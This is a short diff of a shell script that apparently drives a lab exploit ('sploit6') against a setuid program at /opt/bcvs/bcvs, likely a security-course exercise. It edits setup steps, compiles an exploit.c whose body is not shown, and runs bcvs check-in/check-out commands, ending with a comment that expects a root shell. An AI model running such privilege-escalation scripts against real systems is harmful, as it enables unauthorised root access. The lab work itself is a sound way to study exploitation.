@@ -14,16 +14,18 @@
 ## ----------------------------------------------------- ##
 
 EXPLOIT_EXE="./exploit"
-SPLOIT_DIR="sploit6_dir"
+#SPLOIT_DIR="sploit6_dir"
 
 # Setup necessary environment
 
-rm -rf $SPLIOT_DIR
-mkdir -p $SPLOIT_DIR
-cd $SPLOIT_DIR
-mkdir -p .bcvs
-touch .bcvs/block.list
-touch .bcvs/blah
+#rm -rf $SPLIOT_DIR
+#mkdir -p $SPLOIT_DIR
+#cd $SPLOIT_DIR
+#mkdir -p .bcvs
+#touch .bcvs/block.list
+#touch .bcvs/blah
+rm -rf exploit
+rm -rf exploit.c
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -101,7 +103,7 @@ echo ${USER}
 echo ${PATH}
 
 echo "junk" > "dummy_input"
-
+/opt/bcvs/bcvs ci blah < dummy_input
 /opt/bcvs/bcvs co blah < dummy_input
 
 # And then hopefully you have a root shell at this point
